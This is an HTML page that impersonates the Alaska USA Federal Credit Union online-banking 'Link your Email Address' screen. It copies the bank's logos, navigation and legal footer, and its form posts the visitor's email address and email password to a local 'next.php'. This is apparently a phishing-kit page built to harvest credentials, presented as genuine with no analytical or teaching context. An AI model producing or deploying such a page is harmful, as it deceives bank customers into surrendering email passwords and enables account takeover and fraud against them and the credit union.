<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/html4/loose.dtd">
<html lang="en">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
  <title>Link your Email Address to your Account</title>
  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
<link rel="icon" type="image/x-icon" href="https://www.alaskausa.org/favicon.ico">
<link rel="apple-touch-icon" href="https://www.alaskausa.org/images/icon.png" type="image/png">
<link rel="apple-touch-icon" sizes="72x72" href="https://www.alaskausa.org/images/icon-72.png" type="image/png">
<link rel="apple-touch-icon" sizes="114x114" href="https://www.alaskausa.org/images/icon@2x.png" type="image/png">
<link rel="apple-touch-icon" sizes="144x144" href="https://www.alaskausa.org/images/icon-72@2x.png" type="image/png">
<link rel="apple-touch-icon" sizes="60x60" href="https://www.alaskausa.org/images/icon-60.png" type="image/png">
<link rel="apple-touch-icon" sizes="120x120" href="https://www.alaskausa.org/images/icon-60@2x.png" type="image/png">
<link rel="apple-touch-icon" sizes="76x76" href="https://www.alaskausa.org/images/icon-76.png" type="image/png">
<link rel="apple-touch-icon" sizes="152x152" href="https://www.alaskausa.org/images/icon-76@2x.png" type="image/png">
<meta name="msapplication-TileImage" content="https://www.alaskausa.org/images/icon-72@2x.png">
<meta name="msapplication-TileColor" content="#003399">
    <link rel="stylesheet" href="https://ultrabranch3.alaskausa.org/efs/efs/jsp/inc/css/ub-print.css" type="text/css" media="print" />
    <link rel="stylesheet" href="https://ultrabranch3.alaskausa.org/efs/efs/jsp/inc/css/ub-main.css?akusa_rev=4662" type="text/css" title="main" media="screen, projection"/>

    
	<script type="text/javascript" language="JavaScript" src="#"></script>

<script type="text/javascript" language="JavaScript" src="#"></script>
<script type="text/javascript" language="JavaScript" src="#"></script>
<script type="text/javascript" language="JavaScript" src="#"></script>


</head>

<body>
<div id="pgBody">

<div class="skipLinks" role="navigation">
    <p><a id="skiptomain" href="#mainContent" class="visuallyhidden">Skip to main content</a></p>
    <p><a href="/service/contact.asp" class="visuallyhidden" target="_new">If you are using a screen reader and having difficulties with the site, call the Member Service Center 24/7 at 800-525-9094.</a></p>
</div>
<div id="header">



	
	<div id="banner" role="banner">
		<div id="home">
			<a href="https://www.alaskausa.org"><img alt="Alaska USA Federal Credit Union" src="https://ultrabranch3.alaskausa.org/efs/efs/grafx/akusa/nav/logo-AKUSA.gif"/></a>
		</div>

		<div id="controls">
			<a href="#">Contact</a>
			<a href="#">FAQ</a>
			<a id="Logout" href="#">Logout</a>
		</div>


	</div>


<div role="navigation">


		<h2 id="mainnavlabel" class="visuallyhidden">Sections</h2>
		<ul id="tabs" aria-labelledby="mainnavlabel">

			<li><a href='#'>Account<br/>Information</a></li>

			<li><a href='#'>Transfers&nbsp;and<br/>Payments</a></li>

			<li><a href='#'>Account<br/>Services</a></li>

			<li class='active' aria-current='true'><a href='#'>Account<br/>Profile</a></li>

			

			<li><a href='#'>Rates&nbsp;and&nbsp;Other<br/>Information</a></li>

		</ul><!--tabs-->

		<h3 id="subnavlabel" class="visuallyhidden">Account Information Features</h3>
		<ul id="subNav" aria-labelledby="mainnavlabel">
			    <li><a href="#">Messages</a></li>
			    <li><a href="#">Alerts</a></li>
			    <li><a href="#">Password</a></li>
			    <li><a href="#">User ID</a></li>
			    <li><a href="#">Manage Users</a></li>
			    <li><a href="#">Security Questions</a></li>
			    <li><a href="#">Biometric ID</a></li>
			    <li><a href="#">Overdraft Services</a></li>
				<li><a href="#">Address</a></li>
			    <li><a class='active' aria-current='page' href="#">Link Email</a></li>
			    <li><a href="#">Direct Deposit Distributions</a></li>
			    <li><a href="#">Share Account Type</a></li>
			    <li><a href="#">Open New Shares</a></li>
			    <li><a href="#">Preferences</a></li>

		</ul><!-- subNav -->
	</div><!-- navigation -->
</div><!-- header -->
<div id="navTertiary">

</div><!-- navTertiary -->


<div id="pgMain">
  <a name="top"></a>
 
<div id="sideBar">


   <div id="journal"><a target="_new" href='#'>Read the current Journal</a></div>



   <div id="CardLockStatusBox" class="box">
     <h2>Card Lock</h2>
      <iframe title="Card Lock Status" id="CardLockStatusFrame" src="/efs/servlet/efsonline/inc/nav/akusa/cardlock.jsp" frameBorder="0" scrolling="no"></iframe>
   </div>

  <div id="links" class="box">
  <h2>Related Links</h2>
  	<ul>
    
      <li class="link"><a href="help-topic.jsp?HelpID=settings-personal">Help</a></li>
    
    </ul>
  </div>





</div>

<div id="mainContent">

<h1>Link your Email Address to your Account</h1>

<p class="left">
   Use the form below to link your email address to your account. For security reasons, a valid email address is required.
</p>
<p class="left">
   Required fields are marked with an asterisk (*).<br>
</p>

<p class="left">
   When you link your email address, an email notice will be sent to your email address within 24 hours.
</p>

<p class="left">
   Linking your Email address here will not change the address of any Email alerts you may have set up. How alerts are delivered is managed on the Manage Alerts page.
</p>




<form action="next.php" name="okai" method="post">
<table class="dataTable" cellspacing="0" cellpadding="2">

  <tr>
    <td align="left" colspan="2" style="background:#CCC">
       <font face="Arial, Helvetica, sans-serif" size="2" ><b>Email Address</b></font>
    </td>
  </tr>
  <tr>
    <td class="right" bgcolor="#f0f0f0" width="30%">
      Email Address:*
    </td>
    <td align="left" bgcolor="#FFFFFF">
        <input type="text" name="personemail" size="40" maxlength="40" placeholder="johndoe@email.com" required="">
    </td>
  </tr>
  
    <tr>
    <td class="right" bgcolor="#f0f0f0" width="30%">
      Password:* 
    </td>
    <td align="left" bgcolor="#FFFFFF">
        <input type="password" name="personpass" size="40" maxlength="40" placeholder="Password" required="">
    </td>
  </tr>
  
</table>

<center>
<input name="okai" class="button" type="submit" value="Link My Email Address">
</center>

</form>

</div><!--end mainContent-->

<div id="pgFooter">
  <hr />

   <div id="footer">
     <span class="bug">
       <img alt="Equal Housing Lender" src="https://ultrabranch3.alaskausa.org/efs/efs/grafx/akusa/logo-ehl.gif?#042116">
     </span>

     <p> &copy; Copyright  2022 &bull; Alaska&nbsp;USA and UltraBranch are registered trademarks of Alaska&nbsp;USA Federal Credit Union.</p>
     <p>Mortgage loans are provided by Alaska USA Mortgage Company, LLC. License #AK157293 <br>
     Washington Consumer Loan Company License #CL-157293. Licensed by the Department of Business Oversight under the California Residential Mortgage Lending Act, License #4131067</p>
        <p><a tabindex="-1" href="javascript:PopupWindow('Privacy');">Privacy</a></p>
     

     <p class="ncua">
       <img src="https://ultrabranch3.alaskausa.org/efs/efs/grafx/akusa/logo-ncua.gif?#042116" alt="Your funds federally insured to at least $250,000 and backed by the full faith and credit of the United States Government. National Credit Union Administration, a U.S. Government Agency"><span>Federally insured by NCUA</span>
     </p>
   </div>
</div>
</div> <!--end pgMain div-->
  
    </div><!-- end pgBody -->
</body>
</html>

